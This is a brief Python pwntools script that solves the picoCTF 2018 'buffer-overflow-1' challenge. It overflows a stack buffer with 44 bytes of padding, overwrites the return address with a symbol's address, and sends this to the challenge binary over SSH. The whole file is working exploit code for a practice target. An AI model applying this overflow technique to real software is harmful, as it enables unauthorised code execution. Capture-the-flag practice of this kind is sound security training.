#!/usr/bin/python

from pwn import *
import os

PATH = os.path.dirname(os.path.realpath(__file__))

USER = 'awr417h' # Change username accordingly.

vuln = ELF(PATH + '/vuln')

padding = 'A' * 44
payload = p32(vuln.symbols['completed.7209'])

print payload

exploit = padding + payload

s = ssh(host='2018shell1.picoctf.com', user=USER) # Make sure ssh-keyz challenge is done first

py = s.run('cd /problems/buffer-overflow-1_1_8a16ff6a1b3cfb2e42c08d9090051a5d; ./vuln')
print py.recv()
py.sendline(exploit)
print py.recv()
s.close()